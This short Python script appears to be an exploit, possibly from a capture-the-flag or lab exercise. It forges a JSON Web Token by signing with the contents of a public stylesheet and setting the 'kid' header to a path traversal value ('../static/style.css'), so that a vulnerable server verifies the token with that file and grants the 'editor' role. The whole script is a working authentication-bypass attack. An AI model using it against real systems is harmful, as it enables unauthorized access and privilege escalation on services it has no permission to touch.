import jwt

with open("style.css", "rb") as f:
	secret = f.read()

payload = {"sub":"editor", "role":"editor"}
headers = {"kid":"../static/style.css", "typ": "JWT"}

token = jwt.encode(payload, secret, algorithm="HS256", headers=headers)
print(token)
